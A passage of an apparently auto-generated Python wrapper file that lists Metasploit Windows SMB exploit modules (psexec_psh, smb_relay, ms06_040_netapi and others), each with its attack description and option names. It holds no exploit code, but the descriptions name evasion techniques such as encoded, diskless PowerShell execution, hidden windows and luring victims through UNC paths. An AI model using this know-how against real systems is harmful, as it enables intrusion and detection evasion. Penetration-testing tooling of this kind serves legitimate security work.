        payload is encoded in base64 and executed from the commandline using the -encodedcommand
        flag. Using this method, the payload is never written to disk, and given that each payload
        is unique, is less prone to signature based detection. A persist option is provided to
        execute the payload in a while loop in order to maintain a form of persistence. In the
        event of a sandbox observing PSH execution, a delay and other obfuscation may be added to
        avoid detection. In order to avoid interactive process notifications for the current user,
        the psh payload has been reduced in size and wrapped in a powershell invocation which hides
        the window entirely.
      
		"""

		path = 'windows/smb/psexec_psh'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			SERVICE_NAME = 'SERVICE_NAME'
			SERVICE_DISPLAY_NAME = 'SERVICE_DISPLAY_NAME'
			SERVICE_DESCRIPTION = 'SERVICE_DESCRIPTION'
			required_SERVICE_PERSIST = 'SERVICE_PERSIST'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			DryRun = 'DryRun'

	class windows_smb_ipass_pipe_exec(object):
		"""
		
        This module exploits a vulnerability in the IPass Client service. This service provides a
        named pipe which can be accessed by the user group BUILTIN/Users. This pipe can be abused
        to force the service to load a DLL from a SMB share.
      
		"""

		path = 'windows/smb/ipass_pipe_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SMB_DELAY = 'SMB_DELAY'

	class windows_smb_ms06_066_nwapi(object):
		"""
		
          This module exploits a stack buffer overflow in the svchost service when the netware
        client service is running. This specific vulnerability is in the nwapi32.dll module.
      
		"""

		path = 'windows/smb/ms06_066_nwapi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_ms03_049_netapi(object):
		"""
		
          This module exploits a stack buffer overflow in the NetApi32 NetAddAlternateComputerName
        function using the Workstation service in Windows XP.
      
		"""

		path = 'windows/smb/ms03_049_netapi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_smb_relay(object):
		"""
		
          This module will relay SMB authentication requests to another
        host, gaining access to an authenticated SMB session if successful.
        If the connecting user is an administrator and network logins are
        allowed to the target machine, this module will execute an arbitrary
        payload. To exploit this, the target system	must try to	authenticate
        to this module. The easiest way to force a SMB authentication attempt
        is by embedding a UNC path (//SERVER/SHARE) into a web page or
        email message. When the victim views the web page or email, their
        system will automatically connect to the server specified in the UNC
        share (the IP address of the system running this module) and attempt
        to authenticate.  Unfortunately, this
        module is not able to clean up after itself. The service and payload
        file listed in the output will need to be manually removed after access
        has been gained. The service created by this tool uses a randomly chosen
        name and description, so the services list can become cluttered after
        repeated exploitation.

        The SMB authentication relay attack was first reported by Sir Dystic on
        March 31st, 2001 at @lanta.con in Atlanta, Georgia.

        On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin
        includes a patch which prevents the relaying of challenge keys back to
        the host which issued them, preventing this exploit from working in
        the default configuration. It is still possible to set the SMBHOST
        parameter to a third-party host that the victim is authorized to access,
        but the "reflection" attack has been effectively broken.
      
		"""

		path = 'windows/smb/smb_relay'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SMBHOST = 'SMBHOST'
			required_SHARE = 'SHARE'

	class windows_smb_ms06_066_nwwks(object):
		"""
		
          This module exploits a stack buffer overflow in the svchost service, when the netware
        client service is running. This specific vulnerability is in the nwapi32.dll module.
      
		"""

		path = 'windows/smb/ms06_066_nwwks'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_netidentity_xtierrpcpipe(object):
		"""
		
          This module exploits a stack buffer overflow in Novell's NetIdentity Agent. When sending
        a specially crafted string to the 'XTIERRPCPIPE' named pipe, an attacker may be
        able to execute arbitrary code. The success of this module is much greater once the
        service has been restarted.
      
		"""

		path = 'windows/smb/netidentity_xtierrpcpipe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			required_SMBUser = 'SMBUser'
			required_SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'

	class windows_smb_ms09_050_smb2_negotiate_func_index(object):
		"""
		
          This module exploits an out of bounds function table dereference in the SMB
        request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
        release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista
        without SP1 does not seem affected by this flaw.
      
		"""

		path = 'windows/smb/ms09_050_smb2_negotiate_func_index'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_WAIT = 'WAIT'

	class windows_smb_smb_delivery(object):
		"""
		
        This module serves payloads via an SMB server and provides commands to retrieve
        and execute the generated payloads. Currently supports DLLs and Powershell.
      
		"""

		path = 'windows/smb/smb_delivery'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			FOLDER_NAME = 'FOLDER_NAME'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_smb_ms07_029_msdns_zonename(object):
		"""
		
          This module exploits a stack buffer overflow in the RPC interface
        of the Microsoft DNS service. The vulnerability is triggered
        when a long zone name parameter is supplied that contains
        escaped octal strings. This module is capable of bypassing NX/DEP
        protection on Windows 2003 SP1/SP2. This module exploits the
        RPC service using the /DNSSERVER pipe available via SMB. This
        pipe requires a valid user account to access, so the SMBUSER
        and SMBPASS options must be specified.
      
		"""

		path = 'windows/smb/ms07_029_msdns_zonename'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_Locale = 'Locale'

	class windows_smb_ms06_040_netapi(object):
		"""
		
          This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function
        using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that
        other RPC calls could be used to exploit this service. This exploit will result in
        a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt
        will likely result in a complete reboot on Windows 2000 and the termination of all
        SMB-related services on Windows XP. The default target for this exploit should succeed
        on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0.
      
		"""

		path = 'windows/smb/ms06_040_netapi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_generic_smb_dll_injection(object):
		"""
		
